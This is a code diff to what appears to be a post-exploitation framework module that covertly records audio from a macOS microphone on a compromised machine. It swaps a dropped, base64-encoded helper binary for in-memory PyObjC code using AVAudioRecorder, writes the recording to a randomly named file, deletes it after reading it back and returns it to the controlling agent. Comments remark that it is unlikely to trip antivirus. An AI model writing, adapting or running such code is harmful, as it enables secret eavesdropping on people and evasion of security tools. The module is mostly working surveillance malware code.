@@ -1,6 +1,3 @@
-import os
-import base64
-
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -15,8 +12,7 @@ class Module:
 
             # More verbose multi-line description of the module
             'Description': ('Records audio through the MacOS webcam mic '
-                            'using a custom binary that interacts directly '
-                            'with the Apple AVFoundation API.'),
+                            'by leveraging the Apple AVFoundation API.'),
 
             # True if the module needs to run in the background
             'Background': False,
@@ -40,8 +36,10 @@ class Module:
             # List of any references/other comments
             'Comments': [
                 (
-                    'Source code for custom binary: '
-                    'https://github.com/s0lst1c3/osx_mic_record'
+                    'Executed within memory, although recorded audio will '
+                    'touch disk while the script is running. This is unlikely '
+                    'to trip A/V, although a user may notice the audio file '
+                    'if it stored in an obvious location.'
                 ),
             ]
         }
@@ -52,14 +50,14 @@ class Module:
             #   value_name : {description, required, default_value}
             'Agent': {
                 # The 'Agent' option is the only one that MUST be in a module
-                'Description'   :   'Agent to grab a screenshot from.',
+                'Description'   :   'Agent to record audio from.',
                 'Required'      :   True,
                 'Value'         :   '',
             },
             'OutputDir': {
                 'Description'   :   ('Directory on remote machine '
-                                     'in which all binary content '
-                                     'should be saved. (Default: /tmp)'),
+                                     'in recorded audio should be '
+                                     'saved. (Default: /tmp)'),
                 'Required'      :   False,
                 'Value'         :   '/tmp',
             },
@@ -88,53 +86,74 @@ class Module:
 
     def generate(self, obfuscate=False, obfuscationCommand=''):
 
-        output_dir = self.options['OutputDir']['Value']
         record_time = self.options['RecordTime']['Value']
-        osx_mic_record_bin = os.path.join(
-                        self.mainMenu.installPath,
-                        'data/misc/osx_mic_record_bin',
-        )
-        with open(osx_mic_record_bin, 'rb') as input_handle:
-            osx_mic_record_b64 = base64.b64encode(input_handle.read())
+        output_dir = self.options['OutputDir']['Value']
 
         return '''
+import objc
+import objc._objc
+import time
+import sys
+import random
 import os
-import base64
-import string
 
-# setable option parameter are set here
+from string import ascii_letters
+from Foundation import *
+from AVFoundation import *
+
+record_time = %s
 output_dir = '%s'
-record_time = '%s'
-osx_mic_record_b64 = '%s'
 
 if __name__ == '__main__':
 
-    # generate path for osx_mic_record_bin
-    osx_mic_record_bin = ''.join(random.choice(
-                string.ascii_letters) for _ in range(32))
-    osx_mic_record_bin = os.path.join(output_dir, osx_mic_record_bin)
+    pool = NSAutoreleasePool.alloc().init()
 
-    # generate path for saved audio output
-    output_file = ''.join(random.choice(
-                string.ascii_letters) for _ in range(32))
-    output_file = os.path.join(output_dir, output_file)
+    # construct audio URL
+    output_file = ''.join(random.choice(ascii_letters) for _ in range(32))
+    output_path = os.path.join(output_dir, output_file)
+    audio_path_str = NSString.stringByExpandingTildeInPath(output_path)
+    audio_url = NSURL.fileURLWithPath_(audio_path_str)
 
-    # save the osx_mic_record_b64 to disk as a binary file and make executable
-    with open(osx_mic_record_bin, 'wb') as output_handle:
-        output_handle.write(base64.b64decode(osx_mic_record_b64))
-    run_command('chmod 777 ' + osx_mic_record_bin)
+    # fix metadata for AVAudioRecorder
+    objc.registerMetaDataForSelector(
+        b"AVAudioRecorder",
+        b"initWithURL:settings:error:",
+        dict(arguments={4: dict(type_modifier=objc._C_OUT)}),
+    )
+    
+    # initialize audio settings
+    audio_settings = NSDictionary.dictionaryWithDictionary_({
+        'AVEncoderAudioQualityKey' : 0,
+        'AVEncoderBitRateKey' : 16,
+        'AVSampleRateKey': 44100.0,
+        'AVNumberOfChannelsKey': 2,
+    })
 
-    # record for n seconds
-    run_command(' '.join([osx_mic_record_bin, record_time, output_file]))
+    # create the AVAudioRecorder
+    (recorder, error) = AVAudioRecorder.alloc().initWithURL_settings_error_(
+                                        audio_url,
+                                        audio_settings,
+                                        objc.nil,
+    )
+
+    # bail if unable to create AVAudioRecorder
+    if error is not None:
+        NSLog(error)
+        sys.exit(1)
+
+    # record audio for record_time seconds
+    recorder.record()
+    time.sleep(record_time)
+    recorder.stop()
 
     # retrieve content from output file then delete it
-    with open(output_file, 'rb') as input_handle:
+    with open(output_path, 'rb') as input_handle:
         captured_audio = input_handle.read()
-    run_command('rm -f ' + output_file)
+    run_command('rm -f ' + output_path)
 
-    # delete osx_mic_record_bin
-    run_command('rm -f ' + osx_mic_record_bin)
-
+    # return captured audio to agent
     print captured_audio
+
+    del pool
     
-''' % (output_dir, record_time, osx_mic_record_b64) # script
+''' % (record_time, output_dir) # script
